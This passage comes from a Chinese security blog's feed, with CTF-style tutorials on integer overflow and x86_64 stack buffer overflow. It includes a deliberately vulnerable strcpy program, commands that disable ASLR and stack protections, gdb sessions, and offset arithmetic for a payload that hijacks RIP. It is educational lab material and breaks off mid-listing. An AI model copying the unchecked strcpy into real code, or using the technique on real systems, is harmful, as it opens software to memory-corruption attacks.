class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble validate_passwd</span><br><span class="line">Dump of assembler code for function validate_passwd:</span><br><span class="line">   0x0000000000001189 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x000000000000118d &lt;+4&gt;:push   rbp; 压入ebp</span><br><span class="line">   0x000000000000118e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001191 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   0x0000000000001195 &lt;+12&gt;:mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line">   0x0000000000001199 &lt;+16&gt;:mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x000000000000119d &lt;+20&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000000011a0 &lt;+23&gt;:call   0x1090 &lt;strlen@plt&gt;</span><br><span class="line">   0x00000000000011a5 &lt;+28&gt;:mov    BYTE PTR [rbp-0x1],al; 将len存入[rbp-0x1]</span><br><span class="line">   0x00000000000011a8 &lt;+31&gt;:cmp    BYTE PTR [rbp-0x1],0x3</span><br><span class="line">   0x00000000000011ac &lt;+35&gt;:jbe    0x11d5 &lt;validate_passwd+76&gt;</span><br><span class="line">   0x00000000000011ae &lt;+37&gt;:cmp    BYTE PTR [rbp-0x1],0x8</span><br><span class="line">   0x00000000000011b2 &lt;+41&gt;:ja     0x11d5 &lt;validate_passwd+76&gt;</span><br><span class="line">   0x00000000000011b4 &lt;+43&gt;:lea    rdi,[rip+0xe49]        # 0x2004</span><br><span class="line">   0x00000000000011bb &lt;+50&gt;:call   0x1080 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011c0 &lt;+55&gt;:mov    rdx,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x00000000000011c4 &lt;+59&gt;:lea    rax,[rbp-0xc]; 取passwd_buf地址</span><br><span class="line">   0x00000000000011c8 &lt;+63&gt;:mov    rsi,rdx; 传入参数passwd_buf</span><br><span class="line">   0x00000000000011cb &lt;+66&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000000011ce &lt;+69&gt;:call   0x1070 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011d3 &lt;+74&gt;:jmp    0x11e2 &lt;validate_passwd+89&gt;</span><br><span class="line">   0x00000000000011d5 &lt;+76&gt;:lea    rdi,[rip+0xe2e]        # 0x200a</span><br><span class="line">   0x00000000000011dc &lt;+83&gt;:call   0x1080 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011e1 &lt;+88&gt;:nop</span><br><span class="line">   0x00000000000011e2 &lt;+89&gt;:nop</span><br><span class="line">   0x00000000000011e3 &lt;+90&gt;:leave  </span><br><span class="line">   0x00000000000011e4 &lt;+91&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>通过阅读反汇编代码，我们知道缓冲区 <code>passwd_buf</code> 位于 <code>rbp-0xc</code> 的位置（<code>0x00000000000011c4&lt;+71&gt;: lea eax,[rbp-0xc]</code>），而返回地址在 <code>rbp+8</code> 的位置，所以返回地址相对于缓冲区 <code>0x14</code> 的位置。我们测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef$ r `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`</span><br><span class="line">Starting program: /home/sakura/文档/vuln `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`</span><br><span class="line">good!</span><br></pre></td></tr></table></figure><p><img src="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/image-20220810163653885.png" alt="image-20220810163653885"></p><p>可以看到 <code>EIP</code> 被 <code>BBBBBBBB</code> 覆盖，相当于我们获得了返回地址的控制权。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-什么是整数溢出&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是整数溢出&quot;&gt;&lt;/a&gt; 1. 什么是整数溢出&lt;/h2&gt;
&lt;h3 id=&quot;11-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anch</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="整数安全" scheme="https://www.rgzzplus.com/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出x86_64</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/"/>
    <id>https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/</id>
    <published>2022-08-27T04:45:51.000Z</published>
    <updated>2022-08-27T04:47:22.175Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-x86和x86_64的区别"><a class="markdownIt-Anchor" href="#1-x86和x86_64的区别"></a> 1. x86和x86_64的区别</h2><p>第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也<strong>只能使用前47位</strong>，要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个很巧妙的部分。</p><p>事实上还有很多其他的不同但是考虑到本文的目的不了解所有的差异也没关系。</p><h2 id="2-漏洞代码片段"><a class="markdownIt-Anchor" href="#2-漏洞代码片段"></a> 2. 漏洞代码片段</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bof.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123; </span><br><span class="line">      <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">      <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buffer);</span><br><span class="line">      <span class="built_in">strcpy</span>(buffer,  argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意：<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（需要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY，PIE等栈相关保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gcc bof.c -o bof -z execstack -fno-stack-protector -g</span><br></pre></td></tr></table></figure><h2 id="3-触发漏洞"><a class="markdownIt-Anchor" href="#3-触发漏洞"></a> 3. 触发漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ ./bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffddb0</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure><p>我们用 gdb 调试一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gdb-gef bof</span><br><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00005555555551a9 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x00005555555551ad &lt;+4&gt;:push   rbp</span><br><span class="line">   0x00005555555551ae &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x00005555555551b1 &lt;+8&gt;:sub    rsp,0x110</span><br><span class="line">   0x00005555555551b8 &lt;+15&gt;:mov    DWORD PTR [rbp-0x104],edi</span><br><span class="line">   0x00005555555551be &lt;+21&gt;:mov    QWORD PTR [rbp-0x110],rsi</span><br><span class="line">   0x00005555555551c5 &lt;+28&gt;:cmp    DWORD PTR [rbp-0x104],0x2</span><br><span class="line">   0x00005555555551cc &lt;+35&gt;:je     0x5555555551d8 &lt;main+47&gt;</span><br><span class="line">   0x00005555555551ce &lt;+37&gt;:mov    edi,0x0</span><br><span class="line">   0x00005555555551d3 &lt;+42&gt;:call   0x5555555550b0 &lt;exit@plt&gt;</span><br><span class="line">   0x00005555555551d8 &lt;+47&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x00005555555551df &lt;+54&gt;:mov    rsi,rax</span><br><span class="line">   0x00005555555551e2 &lt;+57&gt;:lea    rdi,[rip+0xe1b]        # 0x555555556004</span><br><span class="line">   0x00005555555551e9 &lt;+64&gt;:mov    eax,0x0</span><br><span class="line">   0x00005555555551ee &lt;+69&gt;:call   0x5555555550a0 &lt;printf@plt&gt;</span><br><span class="line">   0x00005555555551f3 &lt;+74&gt;:mov    rax,QWORD PTR [rbp-0x110]</span><br><span class="line">   0x00005555555551fa &lt;+81&gt;:add    rax,0x8</span><br><span class="line">   0x00005555555551fe &lt;+85&gt;:mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x0000555555555201 &lt;+88&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x0000555555555208 &lt;+95&gt;:mov    rsi,rdx</span><br><span class="line">   0x000055555555520b &lt;+98&gt;:mov    rdi,rax</span><br><span class="line">   0x000055555555520e &lt;+101&gt;:call   0x555555555080 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0000555555555213 &lt;+106&gt;:lea    rax,[rbp-0x100]</span><br><span class="line">   0x000055555555521a &lt;+113&gt;:mov    rdi,rax</span><br><span class="line">   0x000055555555521d &lt;+116&gt;:call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x0000555555555222 &lt;+121&gt;:mov    eax,0x0</span><br><span class="line">   0x0000555555555227 &lt;+126&gt;:leave  </span><br><span class="line">=&gt; 0x0000555555555228 &lt;+127&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">gef➤  b strcpy</span><br><span class="line">gef➤  b puts</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Breakpoint 2, 0x00007ffff7e3a420 in puts () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x16</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdd28  →  0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffde40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00007fffffffe3c0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdd40  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e3a420  →  &lt;puts+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdd28│+0x0000: 0x0000555555555222  →  &lt;main+121&gt; mov eax, 0x0 ← $rsp</span><br><span class="line">0x00007fffffffdd30│+0x0008: 0x00007fffffffdf38  →  0x00007fffffffe289  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffdd38│+0x0010: 0x0000000200000340</span><br><span class="line">0x00007fffffffdd40│+0x0018: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot; ← $rax, $rdi</span><br><span class="line">0x00007fffffffdd48│+0x0020: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd50│+0x0028: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd58│+0x0030: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">0x00007fffffffdd60│+0x0038: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e3a40f &lt;popen+143&gt;      jmp    0x7ffff7e3a3e4 &lt;popen+100&gt;</span><br><span class="line">   0x7ffff7e3a411                  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7e3a41b                  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e3a420 &lt;puts+0&gt;         endbr64 </span><br><span class="line">   0x7ffff7e3a424 &lt;puts+4&gt;         push   r14</span><br><span class="line">   0x7ffff7e3a426 &lt;puts+6&gt;         push   r13</span><br><span class="line">   0x7ffff7e3a428 &lt;puts+8&gt;         push   r12</span><br><span class="line">   0x7ffff7e3a42a &lt;puts+10&gt;        mov    r12, rdi</span><br><span class="line">   0x7ffff7e3a42d &lt;puts+13&gt;        push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x7ffff7e3a420 <span class="keyword">in</span> puts (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e3a420 → puts()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x555555555222 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>我们发现，明明在 <code>strcpy</code> 上也下了断点，可是并未停止，不知道为什么我们 <code>r</code> 后，直接就在 <code>puts</code> 处停止了。过了 <code>strcpy</code> 调用之后你会发现当前缓冲区指针指向 <code>0x00007fffffffdd40</code> 而不是 <code>0x7fffffffddb0</code> 这是gdb的环境变量和其他东西造成的。不过现在我们不关心之后会解决的，继续向下看 si 到 <code>ret</code> 指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gef➤  finish</span><br><span class="line">......</span><br><span class="line">gef➤  si</span><br><span class="line">0x000055555555522814&#125;</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde48  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x12d</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf30  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde48│+0x0000: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; ← $rsp</span><br><span class="line">0x00007fffffffde50│+0x0008: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde58│+0x0010: &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde60│+0x0018: &quot;AAAAAAAAAAAA&quot;</span><br><span class="line">0x00007fffffffde68│+0x0020: 0x0000550041414141 (&quot;AAAA&quot;?)</span><br><span class="line">0x00007fffffffde70│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde78│+0x0030: 0x395b03b9e69a9ef5</span><br><span class="line">0x00007fffffffde80│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9       &#125;</span><br><span class="line">     10       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11       strcpy(buffer,  argv[1]);</span><br><span class="line">     12       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13       return 0;</span><br><span class="line"> →   14 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf38)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>当执行 <code>ret</code> 时，<code>rsp ---&gt; 0x4141414141414141</code>，我们没能控制 <code>RIP</code> 为什么因为我们覆盖了太多位，最大的地址是 <code>0x00007fffffffffff</code> 而我们尝试用 <code>0x4141414141414141</code> 去溢出了。</p><h2 id="4-控制rip"><a class="markdownIt-Anchor" href="#4-控制rip"></a> 4. 控制RIP</h2><p>为了解决这个问题，我们可以用个小一点的缓冲区去溢出这样指向 <code>rsp</code> 的地址就会像 <code>0x0000414141414141</code> 一样了。 通过简单的数学运算就可以很轻松地算出我们缓冲区的大小。我们知道缓冲区开始于 <code>0x00007fffffffdd40</code> 。strcpy 之后 rsp 将指向 <code>0x00007fffffffde48</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007fffffffde48 - 0x00007fffffffdd40 = 0x108 -&gt; 十进制的264</span><br></pre></td></tr></table></figure><p>知道了这些我们可以把溢出载荷修改成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;B&quot; * 6</span><br></pre></td></tr></table></figure><p>rsp指向的地址应该是 0x0000424242424242 ，那样就能控制RIP。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span 